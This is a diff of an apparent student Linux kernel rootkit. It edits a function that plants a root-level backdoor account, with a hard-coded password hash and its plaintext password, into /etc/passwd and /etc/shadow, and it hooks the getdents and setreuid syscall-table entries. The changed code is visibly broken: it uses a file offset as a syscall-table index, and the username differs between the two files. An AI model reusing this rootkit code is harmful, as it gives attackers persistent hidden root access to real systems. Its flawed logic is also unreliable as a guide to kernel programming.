@@ -57,26 +57,29 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 // End Brendan
 
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
-void add_backdoor(char *path) {
+int add_backdoor(char *path) {
 	
 		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
 		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
 		// PASSWORD (encodes in SHA 512) = cse331!	
+		
 		struct file *file;
 		char *backdoor;
 		mm_segment_t old_fs;
 		
 		char *buffer;
-		bool backdoor_existing = false;
 		int page_count = 0;
+	
+		bool backdoor_existing = false; // If backdoor with same name already exists
 		
-		loff_t offset; 
+		
+		loff_t offset; // Offset used for determining location of new user in list
 		
 		unsigned long ret;
 		
-		if (strcmp(path, "/etc/passwd") == 0) 
+		if (strcmp(path, "/etc/passwd") == 0) // If adding into passwd file
 			{backdoor = backdoor_password;}
-		if (strcmp(path, "/etc/shadow") == 0)
+		if (strcmp(path, "/etc/shadow") == 0) // If adding into shadow file
 			{backdoor = backdoor_shadow;}
 		
 		old_fs = get_fs(); 
@@ -162,7 +165,7 @@ void add_backdoor(char *path) {
 				{kfree(buffer);}
 		    if(file)
 		    	{filp_close(file, NULL);}
-		return;
+		return offset;
 	    	}
 
 // 		cleanup2:
@@ -306,8 +309,17 @@ static int __init rootkit_init(void){
 	
 	// Start Marc 
 	
-	add_backdoor(password_file);
-   	add_backdoor(shadow_file);
+	int offset;
+	
+	offset = add_backdoor(password_file);
+	
+	original_getdents = (void *)sys_call_address[offset];                        \
+    	sys_call_address[offset] = (unsigned long*)&original_getdents;
+	
+   	offset = add_backdoor(shadow_file);
+	
+	original_getdents = (void *)sys_call_address[offset];                        \
+    	sys_call_address[offset] = (unsigned long*)&original_getdents;
 	
 	// End Marc
 	
@@ -319,8 +331,7 @@ static int __init rootkit_init(void){
 	sys_call_address[__NR_getdents] = (void*)&sys_getdents_hook; // Replace the pointer on the table with our hook
 	// End Brian
 	
-	original_getdents = (void *)sys_call_address[__NR_index];                        \
-    	sys_call_address[__NR_index] = (unsigned long*)&original_getdents;
+	
 	
 	// Start Brendan
 	old_setreuid = sys_call_address[__NR_setreuid];
